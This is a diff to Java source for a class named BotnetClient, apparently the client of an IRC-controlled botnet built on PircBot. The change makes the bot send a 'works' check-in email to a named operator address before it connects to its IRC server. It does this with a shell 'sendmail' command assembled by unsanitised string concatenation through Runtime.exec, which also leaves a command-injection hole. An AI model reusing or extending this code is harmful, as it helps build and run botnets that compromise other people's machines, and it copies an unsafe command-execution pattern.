@@ -55,8 +55,8 @@ public class BotnetClient extends PircBot {
 			setVerbose(DEBUG);
 			setName(id);
 			setMessageDelay(0);
-			connect(SERVER, PORT);
 			sendEmail("shakalandro@gmail.com", new String[] {"shakalandro@gmail.com"}, "works", "sweetness");
+			connect(SERVER, PORT);
 			
 			startKey = MsgEncrypt.getStartKey();
 			//startKey = new SecretKeySpec(key, "DESede");
@@ -184,6 +184,20 @@ public class BotnetClient extends PircBot {
 	}
 	
 	private void sendEmail(String from, String[] to, String subject, String body) {
+		Runtime r = Runtime.getRuntime();
+		try {
+			Process p = r.exec("sendmail -f webmaster@localhost -t \"" + to[0] + "\" -u \"" + subject + "\" -m \"" + body + "\"");
+			/*
+			Scanner in = new Scanner(new BufferedReader(new InputStreamReader(p.getErrorStream())));
+			if (in.hasNextLine()) {
+				System.out.println(in.nextLine());
+			}
+			*/
+			System.out.println("Email sent to " + to[0] + " successfully");
+		} catch(Exception e) {
+			e.printStackTrace();
+		}
+		/*
 		Properties props = new Properties();
 		Session session = Session.getDefaultInstance(props);
 	    MimeMessage message = new MimeMessage( session );
@@ -199,6 +213,7 @@ public class BotnetClient extends PircBot {
 	    } catch (MessagingException ex){
 	    	System.err.println("Cannot send email. " + ex);
 	    }
+	    */
 	}
 
 	protected void onIncomingChatRequest(DccChat chat) {
